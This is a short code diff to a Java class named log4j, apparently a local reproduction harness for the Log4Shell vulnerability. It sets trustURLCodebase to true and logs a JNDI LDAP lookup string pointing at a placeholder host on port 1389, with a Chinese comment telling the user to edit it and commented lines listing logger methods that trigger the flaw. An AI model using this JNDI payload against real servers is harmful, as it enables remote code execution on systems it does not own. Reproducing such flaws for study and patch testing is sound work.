@@ -9,7 +9,7 @@ public class log4j {
 
     public static void main(String[] args) {
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
-        logger.error("${jndi:ldap://{ip port}:1389/Log4jRCE}"); //这里注意修改！
+        logger.error("${jndi:ldap://{ip port}:1389/asdzxcasd}"); //这里注意修改！
          //以下是可触发漏洞方法
         //logger.error(log);
         //logger.fatal(log);
